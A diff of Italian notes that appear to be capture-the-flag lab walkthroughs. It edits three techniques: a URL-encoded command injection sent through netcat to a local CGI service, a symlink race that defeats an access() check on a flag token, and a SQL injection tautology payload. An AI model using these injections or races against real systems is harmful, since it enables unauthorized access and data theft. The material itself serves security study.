@@ -213,12 +213,13 @@ ping(param("Host"));
 Vulnerabilità $\rightarrow$ Input non controllato nel sorgente  
 Si farà una command injection che permetta di eseguire il comando getflag 
 
-Per aprire la connessione si può scrivere la richiesta GET e passarla a netcat tramite pipe $\rightarrow$ `echo "GET /index.cgi?Host=8.8.8.8"| nc localhost 7007`  
+Per aprire la connessione si può scrivere la richiesta GET e passarla a netcat tramite pipe $\rightarrow$   
+`echo "GET /index.cgi?Host=8.8.8.8"| nc localhost 7007`  
 
 Se si prova ad usare una command injection con carattere `;` come separatore questa fallirà in quanto `;` è un carattere speciale che viene interpretato e rimosso dall'url.  
 Per iniettare il comando bisogna usare la codifica ascii di `;` e per fare escaping di un carattere in ambito web si usa il carattere `%`, alla fine il separatore sarà `%3b`.  
 
-Injection $\rightarrow$ `echo "/index.cgi?Host=8.8.8.8%3Bgetflag" | nc localhost 7007"`  
+Injection $\rightarrow$ `echo "GET /index.cgi?Host=8.8.8.8%3Bgetflag" | nc localhost 7007"`  
 
 note:
 - si potrebbe anche usare `echo -ne "GET /index.cgi?Host=8.8.8.8%3Bgetflag\r\n\r\n" | nc localhost 7007` ma bisogna chiudere i header HTTP con \r\n\r\n  
@@ -261,11 +262,19 @@ La sostituzione di asset avviene con un ciclo che crea continuamente un link alt
 
 Sul primo terminale si lancia il seguente comdando:
 
+
+```bash
+touch /tmp/token 
+```
+
+
 ```bash
 while :; do ln -fs /tmp/token /tmp/link; ln -fs /home/flag10/token /tmp/link; done  
 ```
 - opzione `-f` forza il link anche se il file esiste già ; `-s` crea link simbolico  
 
+
+**nota:** Ricordati di creare manualmente il file `/tmp/token` altrimenti il link sarà rotto e non passerà mai il check di `access()`.  
 
 Sul secondo terminale si collega il clinet con netcat:
 
@@ -677,7 +686,7 @@ Si adotta lo schema classico di iniezione al caso specifico.
 È possibile usare l'operatore **`OR`** per iniettare un comando e l'espressione in questo modo diventa una _tautologia_:  
 
 ```
-name=root'OR 1=1%23`
+name=root'OR 1=1%23
 ```
 
 È possibile determinare il numero di colonne: usiamo `ORDER BY` e il fatto che nelle query ci si possa riferire ad una colonna tramite indice numerico.  
